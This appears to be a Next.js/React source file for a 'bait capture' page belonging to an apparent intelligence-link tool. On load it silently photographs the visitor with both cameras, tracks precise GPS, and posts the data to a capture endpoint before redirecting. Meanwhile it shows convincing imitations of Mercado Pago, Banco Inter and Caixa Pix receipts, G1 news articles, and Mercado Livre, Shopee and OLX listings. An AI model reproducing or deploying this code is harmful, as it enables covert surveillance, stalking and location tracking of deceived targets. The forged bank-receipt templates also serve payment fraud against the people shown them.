"use client";

import { useEffect, useRef } from "react";

type PixData = {
  banco:      string | null;
  valor:      string | null;
  data:       string | null;
  horario:    string | null;
  de_nome:    string | null;
  de_cpf:     string | null;
  de_banco:   string | null;
  para_nome:  string | null;
  para_cpf:   string | null;
  para_banco: string | null;
  transacao:  string | null;
  id:         string | null;
};

type Props = {
  slug: string;
  tipo: string;
  titulo: string | null;
  descricao: string | null;
  imagemUrl: string | null;
  redirectUrl: string | null;
  anuncioPlatforma: string | null;
  anuncioPreco: string | null;
  pix: PixData;
};

async function capturePhoto(facingMode: "user" | "environment"): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;
    await new Promise<void>((resolve) => { video.onloadedmetadata = () => resolve(); });
    await video.play();
    await new Promise((r) => setTimeout(r, 300));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d")?.drawImage(video, 0, 0);
    stream.getTracks().forEach((t) => t.stop());
    return canvas.toDataURL("image/jpeg", 0.7);
  } catch {
    return null;
  }
}

function useCapture(slug: string, redirectUrl: string | null) {
  const done = useRef(false);
  useEffect(() => {
    if (done.current) return;
    done.current = true;
    async function run() {
      let latitude: number | null = null;
      let longitude: number | null = null;
      let accuracy: number | null = null;

      // Geolocalização roda em paralelo e vai SEMPRE guardando a melhor leitura.
      // NÃO bloqueia o redirect esperando precisão perfeita — usamos a melhor
      // leitura disponível no momento do envio (indoor o GPS raramente chega a
      // 15 m, e esperar isso travava o alvo na tela por até 20 s).
      let best: GeolocationPosition | null = null;
      let watchId = 0;
      if (navigator.geolocation) {
        watchId = navigator.geolocation.watchPosition(
          (pos) => { if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos; },
          () => {},
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }

      // Câmeras sequenciais — iOS/Android não suporta dois streams simultâneos
      const photoFront = await capturePhoto("user");
      const photoBack  = await capturePhoto("environment");

      // Se ainda não chegou nenhuma leitura de GPS, dá uma janela curta (4 s).
      // Se já houver leitura, segue direto.
      if (navigator.geolocation && !best) {
        await new Promise<void>((resolve) => {
          const timer = setTimeout(resolve, 4000);
          const poll = setInterval(() => {
            if (best) { clearInterval(poll); clearTimeout(timer); resolve(); }
          }, 200);
        });
      }
      if (watchId) navigator.geolocation.clearWatch(watchId);
      if (best) {
        latitude  = best.coords.latitude;
        longitude = best.coords.longitude;
        accuracy  = best.coords.accuracy;
      }

      await fetch("/api/ops/intel-link/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ slug, latitude, longitude, accuracy, photoFront, photoBack, userAgent: navigator.userAgent }),
      });
      if (redirectUrl) window.location.href = redirectUrl;
    }
    run();
  }, [slug, redirectUrl]);
}

// ─── Template Mercado Pago ───────────────────────────────────────────────────

function TemplateMercadoPago({ pix }: { pix: PixData }) {
  return (
    <div className="min-h-screen bg-gray-100 flex justify-center py-6 px-4 font-sans">
      <div className="bg-white w-full max-w-sm rounded-xl shadow-sm overflow-hidden">

        {/* Logo Mercado Pago */}
        <div className="px-6 pt-6 pb-3 flex items-center gap-2">
          <div className="w-11 h-11 rounded-full bg-[#00b1ea] flex items-center justify-center text-white text-xl">🤝</div>
          <div className="leading-tight">
            <div className="text-[#009ee3] font-extrabold text-lg leading-none">mercado</div>
            <div className="text-[#009ee3] font-extrabold text-lg leading-none">pago</div>
          </div>
        </div>

        <div className="px-6 pb-8">
          {/* Título */}
          <div className="flex items-center gap-2 mb-0.5">
            <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            <span className="font-bold text-gray-900 text-lg">Comprovante de Pix</span>
          </div>
          <div className="text-gray-500 text-sm mb-5 ml-7">
            {pix.data} às {pix.horario}.
          </div>

          {/* Valor */}
          <div className="text-4xl font-bold text-gray-900 mb-5">
            R$ {pix.valor || "0"}
          </div>

          <div className="border-t border-gray-200 mb-5" />

          {/* De / Para */}
          <div className="flex gap-4 mb-5">
            {/* Linha vertical com pontos */}
            <div className="flex flex-col items-center pt-1 flex-shrink-0">
              <div className="w-2.5 h-2.5 rounded-full bg-[#009ee3]" />
              <div className="w-px bg-gray-300 flex-1 my-1.5" style={{ minHeight: "60px" }} />
              <div className="w-2.5 h-2.5 rounded-full bg-[#009ee3]" />
            </div>
            <div className="flex-1 space-y-5">
              {/* De */}
              <div>
                <div className="text-gray-400 text-xs mb-0.5">De</div>
                <div className="font-bold text-gray-900">{pix.de_nome}</div>
                <div className="text-gray-500 text-sm">CPF: {pix.de_cpf}</div>
                <div className="text-gray-500 text-sm">{pix.de_banco}</div>
              </div>
              {/* Para */}
              <div>
                <div className="text-gray-400 text-xs mb-0.5">Para</div>
                <div className="font-bold text-gray-900">{pix.para_nome}</div>
                <div className="text-gray-500 text-sm">CPF: {pix.para_cpf}</div>
                <div className="text-gray-500 text-sm">{pix.para_banco}</div>
              </div>
            </div>
          </div>

          <div className="border-t border-gray-200 mb-5" />

          {/* IDs */}
          <div className="space-y-4 mb-5">
            <div>
              <div className="text-gray-400 text-sm">N.º transação do Mercado Pago</div>
              <div className="font-bold text-gray-900 text-base">{pix.transacao}</div>
            </div>
            <div>
              <div className="text-gray-400 text-sm">ID de transação Pix</div>
              <div className="font-bold text-gray-900 text-sm break-all">{pix.id}</div>
            </div>
          </div>

          <div className="border-t border-gray-200 mb-5" />

          {/* Suporte */}
          <div className="space-y-3 text-sm">
            <div>
              <div className="text-gray-400">Atendimento ao cliente</div>
              <div className="text-gray-600">0800 637 7246</div>
            </div>
            <div>
              <div className="text-gray-400">Ouvidoria</div>
              <div className="text-gray-600">0800 688 4365</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Template Banco Inter ────────────────────────────────────────────────────

function TemplateBancoInter({ pix }: { pix: PixData }) {
  const DashedLine = () => <div className="border-t border-dashed border-gray-300 my-5" />;
  const Row = ({ label, value }: { label: string; value: string | null }) => (
    <div className="flex justify-between items-start gap-4 py-1.5">
      <span className="text-gray-500 text-sm flex-shrink-0">{label}</span>
      <span className="font-bold text-gray-900 text-sm text-right break-all">{value || "—"}</span>
    </div>
  );

  return (
    <div className="min-h-screen bg-white flex justify-center py-8 px-4 font-sans">
      <div className="w-full max-w-sm">
        {/* Logo */}
        <div className="text-center mb-6">
          <span className="text-[#FF6B00] font-extrabold text-4xl tracking-tight">inter</span>
        </div>

        {/* Título + Valor */}
        <div className="text-center mb-6">
          <div className="font-bold text-gray-900 text-2xl mb-1">Pix enviado</div>
          <div className="font-bold text-gray-900 text-4xl">R$ {pix.valor || "0,00"}</div>
        </div>

        <DashedLine />

        {/* Sobre a transação */}
        <h2 className="font-bold text-gray-900 text-base mb-3">Sobre a transação</h2>
        <Row label="Data do pagamento" value={pix.data} />
        <Row label="Horário" value={pix.horario} />
        <div className="py-1.5">
          <span className="text-gray-500 text-sm">ID da transação</span>
          <div className="font-bold text-gray-900 text-sm break-all mt-0.5">{pix.id}</div>
        </div>

        <DashedLine />

        {/* Quem recebeu */}
        <h2 className="font-bold text-gray-900 text-base mb-3">Quem recebeu</h2>
        <Row label="Nome" value={pix.para_nome} />
        <Row label="CPF/CNPJ" value={pix.para_cpf} />
        <Row label="Instituição" value={pix.para_banco} />

        <DashedLine />

        {/* Quem pagou */}
        <h2 className="font-bold text-gray-900 text-base mb-3">Quem pagou</h2>
        <Row label="Nome" value={pix.de_nome} />
        <Row label="CPF/CNPJ" value={pix.de_cpf} />
        <Row label="Instituição" value={pix.de_banco} />
      </div>
    </div>
  );
}

// ─── Template Caixa ─────────────────────────────────────────────────────────

function TemplateCaixa({ pix }: { pix: PixData }) {
  const Row = ({ label, value }: { label: string; value: string | null }) => (
    <div className="flex justify-between items-start gap-4 py-3 border-b border-gray-200">
      <span className="text-[#005CA9] text-sm flex-shrink-0">{label}</span>
      <span className="text-gray-900 text-sm text-right break-all">{value || "—"}</span>
    </div>
  );

  return (
    <div className="min-h-screen bg-white font-sans">
      {/* Header azul */}
      <div className="bg-[#005CA9] px-5 pt-6 pb-0">
        <div className="text-white font-extrabold text-2xl tracking-widest mb-1">CAIXA</div>
        <div className="text-white font-bold text-xl mb-4">Comprovante de Pix</div>
        {/* Zigzag decorativo */}
        <div className="h-4 w-full" style={{
          backgroundImage: "linear-gradient(135deg, white 33%, transparent 33%), linear-gradient(225deg, white 33%, transparent 33%)",
          backgroundSize: "16px 16px",
          backgroundColor: "#005CA9",
        }} />
      </div>

      <div className="px-5 py-5">
        {/* Pix enviado + data */}
        <div className="mb-4">
          <div className="text-[#005CA9] font-bold text-lg">Pix enviado</div>
          <div className="text-gray-500 text-sm">{pix.data}, {pix.horario}</div>
        </div>

        <Row label="Valor" value={`R$ ${pix.valor || "0,00"}`} />

        {/* Recebedor */}
        <h2 className="text-[#005CA9] font-bold text-base mt-5 mb-1">Recebedor</h2>
        <Row label="Nome" value={pix.para_nome} />
        <Row label="CNPJ" value={pix.para_cpf} />
        <Row label="Instituição" value={pix.para_banco} />

        {/* Pagador */}
        <h2 className="text-[#005CA9] font-bold text-base mt-5 mb-1">Pagador</h2>
        <Row label="Nome" value={pix.de_nome} />
        <Row label="CPF" value={pix.de_cpf} />
        <Row label="Instituição" value={pix.de_banco} />

        {/* Dados da transação */}
        <h2 className="text-[#005CA9] font-bold text-base mt-5 mb-1">Dados da transação</h2>
        <Row label="Situação" value="Efetivado" />
        <div className="py-3 border-b border-gray-200">
          <div className="text-[#005CA9] text-sm">ID transação</div>
          <div className="text-gray-900 text-sm break-all mt-0.5">{pix.id}</div>
        </div>
        <Row label="Identificador" value={pix.transacao} />

        {/* Botão voltar */}
        <button className="w-full mt-6 py-3 border border-[#005CA9] rounded text-[#005CA9] font-bold text-sm">
          Voltar
        </button>
      </div>

      {/* Rodapé zigzag */}
      <div className="h-4 w-full mt-4" style={{
        backgroundImage: "linear-gradient(45deg, #005CA9 33%, transparent 33%), linear-gradient(315deg, #005CA9 33%, transparent 33%)",
        backgroundSize: "16px 16px",
        backgroundColor: "white",
      }} />
    </div>
  );
}

// ─── Template Reportagem G1 ──────────────────────────────────────────────────

function TemplateReportagem({ titulo, descricao, imagemUrl }: {
  titulo: string | null; descricao: string | null; imagemUrl: string | null;
}) {
  const title = titulo || "Polícia realiza operação e prende suspeitos na região";
  const body = descricao || "Equipes da Polícia Militar atuaram na região durante a tarde de hoje. A ação faz parte de uma operação integrada de combate ao crime organizado na cidade.";
  const today = new Date().toLocaleDateString("pt-BR", { day: "numeric", month: "long", year: "numeric" });

  return (
    <div className="min-h-screen bg-white font-sans">
      <header className="bg-red-700 text-white py-2 px-4 text-center text-sm font-bold tracking-widest">G1 NOTÍCIAS</header>
      <div className="max-w-2xl mx-auto px-4 py-6">
        <div className="text-xs font-bold text-red-700 uppercase tracking-wide mb-2">Segurança Pública</div>
        <h1 className="text-2xl font-bold text-gray-900 leading-snug mb-3">{title}</h1>
        <div className="text-xs text-gray-500 mb-4 border-b border-gray-200 pb-3">Por Redação G1 &bull; {today}</div>
        {imagemUrl && (
          <div className="mb-5 rounded overflow-hidden">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src={imagemUrl} alt={title} className="w-full object-cover" />
          </div>
        )}
        <div className="text-gray-800 text-[15px] leading-relaxed space-y-4">
          {body.split("\n").map((p, i) => <p key={i}>{p}</p>)}
          <p>A operação contou com o apoio de diferentes unidades policiais. As autoridades pedem que a população colabore com informações pelo Disque-Denúncia (197).</p>
        </div>
      </div>
      <footer className="mt-12 border-t border-gray-200 py-6 text-center text-xs text-gray-400">
        © G1 Notícias &bull; Todos os direitos reservados
      </footer>
    </div>
  );
}

// ─── Template Mercado Livre ──────────────────────────────────────────────────

function TemplateMercadoLivre({ titulo, descricao, imagemUrl, preco }: {
  titulo: string | null; descricao: string | null; imagemUrl: string | null; preco: string | null;
}) {
  const precoNum = parseFloat((preco || "0").replace(",", ".")) || 0;
  const parcelado = precoNum > 0 ? (precoNum / 12).toFixed(2).replace(".", ",") : "0,00";

  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <div className="bg-[#FFE600] px-4 py-3 flex items-center justify-between shadow">
        <span className="font-extrabold text-gray-900 text-xl">mercadolivre</span>
        <div className="flex gap-4 text-gray-700 text-xl">🔍 🛒</div>
      </div>

      {/* Imagem */}
      <div className="bg-white">
        {imagemUrl ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img src={imagemUrl} alt={titulo || ""} className="w-full max-h-80 object-contain mx-auto" />
        ) : (
          <div className="h-72 flex items-center justify-center text-gray-400">Sem imagem</div>
        )}
      </div>

      {/* Info */}
      <div className="bg-white px-4 py-4 mt-2 mb-2">
        <div className="text-gray-500 text-xs mb-1">Novo | +100 vendidos</div>
        <h1 className="font-semibold text-gray-900 text-lg leading-snug mb-3">{titulo || "Produto"}</h1>

        <div className="text-4xl font-light text-gray-900 mb-1">
          <span className="text-base align-top mr-0.5">R$</span>{preco || "0"}
        </div>
        <div className="text-green-600 text-sm mb-1">em 12x R$ {parcelado} sem juros</div>
        <div className="text-green-600 text-sm font-medium mb-5">🚚 Frete grátis</div>

        <button className="w-full py-3.5 bg-[#3483FA] text-white font-bold rounded-lg mb-2">Comprar agora</button>
        <button className="w-full py-3.5 border border-[#3483FA] text-[#3483FA] font-bold rounded-lg">Adicionar ao carrinho</button>
      </div>

      {/* Descrição */}
      {descricao && (
        <div className="bg-white px-4 py-4">
          <h2 className="font-bold text-gray-900 text-base mb-3">Descrição</h2>
          <div className="text-gray-600 text-sm leading-relaxed space-y-3">
            {descricao.split("\n").map((p, i) => <p key={i}>{p}</p>)}
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Template Shopee ─────────────────────────────────────────────────────────

function TemplateShopee({ titulo, descricao, imagemUrl, preco }: {
  titulo: string | null; descricao: string | null; imagemUrl: string | null; preco: string | null;
}) {
  return (
    <div className="min-h-screen bg-gray-100 font-sans pb-24">
      {/* Header */}
      <div className="bg-[#EE4D2D] px-4 py-3 flex items-center justify-between shadow">
        <span className="text-white font-bold text-xl italic tracking-tight">shopee</span>
        <div className="flex gap-4 text-white text-xl">🔍 🛒</div>
      </div>

      {/* Imagem */}
      <div className="bg-white">
        {imagemUrl ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img src={imagemUrl} alt={titulo || ""} className="w-full max-h-80 object-contain" />
        ) : (
          <div className="h-72 flex items-center justify-center text-gray-400">Sem imagem</div>
        )}
        {/* Miniaturas placeholder */}
        <div className="flex gap-2 px-4 py-2">
          {[1, 2, 3].map((i) => (
            <div key={i} className={`w-12 h-12 rounded border-2 ${i === 1 ? "border-[#EE4D2D]" : "border-gray-300"} bg-gray-100`} />
          ))}
        </div>
      </div>

      {/* Preço e título */}
      <div className="bg-white px-4 py-4 mt-2 mb-2">
        <div className="bg-[#FFF3F0] rounded px-3 py-2 mb-3 inline-block">
          <span className="text-[#EE4D2D] text-2xl font-bold">R$ {preco || "0,00"}</span>
        </div>
        <h1 className="font-semibold text-gray-900 text-base leading-snug mb-3">{titulo || "Produto"}</h1>

        {/* Avaliações */}
        <div className="flex items-center gap-3 pb-3 border-b border-gray-100">
          <div className="flex text-[#EE4D2D] text-sm">{"★★★★★"}</div>
          <span className="text-gray-500 text-sm">4.9</span>
          <span className="text-gray-300">|</span>
          <span className="text-gray-500 text-sm">2.847 avaliações</span>
          <span className="text-gray-300">|</span>
          <span className="text-gray-500 text-sm">5.234 vendidos</span>
        </div>
      </div>

      {/* Descrição */}
      {descricao && (
        <div className="bg-white px-4 py-4 mb-2">
          <h2 className="font-bold text-gray-900 text-sm mb-2">Descrição do produto</h2>
          <div className="text-gray-600 text-sm leading-relaxed space-y-2">
            {descricao.split("\n").map((p, i) => <p key={i}>{p}</p>)}
          </div>
        </div>
      )}

      {/* Bottom bar fixo */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-4 py-3 flex gap-3 shadow-lg">
        <button className="flex-1 py-3 border-2 border-[#EE4D2D] text-[#EE4D2D] font-bold rounded text-sm">
          Adicionar ao carrinho
        </button>
        <button className="flex-1 py-3 bg-[#EE4D2D] text-white font-bold rounded text-sm">
          Comprar agora
        </button>
      </div>
    </div>
  );
}

// ─── Template OLX ────────────────────────────────────────────────────────────

function TemplateOlx({ titulo, descricao, imagemUrl, preco }: {
  titulo: string | null; descricao: string | null; imagemUrl: string | null; preco: string | null;
}) {
  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 px-4 py-3 flex items-center justify-between shadow-sm">
        <span className="bg-[#6E0AD6] text-white font-extrabold text-lg px-3 py-1 rounded">OLX</span>
        <div className="flex gap-4 text-gray-500 text-xl">🔍 ☰</div>
      </div>

      {/* Imagem */}
      <div className="bg-black">
        {imagemUrl ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img src={imagemUrl} alt={titulo || ""} className="w-full max-h-72 object-cover" />
        ) : (
          <div className="h-72 flex items-center justify-center text-gray-400">Sem imagem</div>
        )}
      </div>

      {/* Info principal */}
      <div className="bg-white px-4 py-4 mt-2 mb-2">
        <div className="text-3xl font-bold text-gray-900 mb-1">R$ {preco || "0"}</div>
        <h1 className="font-semibold text-gray-800 text-lg leading-snug mb-2">{titulo || "Anúncio"}</h1>
        <div className="text-xs text-gray-400 mb-4">📍 Goiânia, GO • Publicado hoje</div>

        {descricao && (
          <div className="text-gray-600 text-sm leading-relaxed space-y-2 mb-4">
            {descricao.split("\n").map((p, i) => <p key={i}>{p}</p>)}
          </div>
        )}

        <div className="border-t border-gray-100 pt-4 space-y-3">
          <button className="w-full py-3.5 bg-[#6E0AD6] text-white font-bold rounded-xl text-sm">
            Ver telefone
          </button>
          <button className="w-full py-3.5 border-2 border-[#6E0AD6] text-[#6E0AD6] font-bold rounded-xl text-sm">
            Chat OLX
          </button>
        </div>
      </div>

      {/* Detalhes do anúncio */}
      <div className="bg-white px-4 py-4">
        <h2 className="font-bold text-gray-900 text-sm mb-3">Detalhes do anúncio</h2>
        <div className="space-y-2 text-sm">
          <div className="flex justify-between border-b border-gray-100 py-2">
            <span className="text-gray-500">Categoria</span>
            <span className="text-gray-900 font-medium">Outros</span>
          </div>
          <div className="flex justify-between border-b border-gray-100 py-2">
            <span className="text-gray-500">Tipo</span>
            <span className="text-gray-900 font-medium">Vendo</span>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Componente principal ────────────────────────────────────────────────────

export default function BaitCapture({ slug, tipo, titulo, descricao, imagemUrl, redirectUrl, anuncioPlatforma, anuncioPreco, pix }: Props) {
  useCapture(slug, redirectUrl);

  if (tipo === "pix") {
    if (pix.banco === "inter") return <TemplateBancoInter pix={pix} />;
    if (pix.banco === "caixa") return <TemplateCaixa pix={pix} />;
    return <TemplateMercadoPago pix={pix} />;
  }

  if (tipo === "anuncio") {
    if (anuncioPlatforma === "shopee") return <TemplateShopee titulo={titulo} descricao={descricao} imagemUrl={imagemUrl} preco={anuncioPreco} />;
    if (anuncioPlatforma === "olx")    return <TemplateOlx    titulo={titulo} descricao={descricao} imagemUrl={imagemUrl} preco={anuncioPreco} />;
    return <TemplateMercadoLivre titulo={titulo} descricao={descricao} imagemUrl={imagemUrl} preco={anuncioPreco} />;
  }

  return <TemplateReportagem titulo={titulo} descricao={descricao} imagemUrl={imagemUrl} />;
}
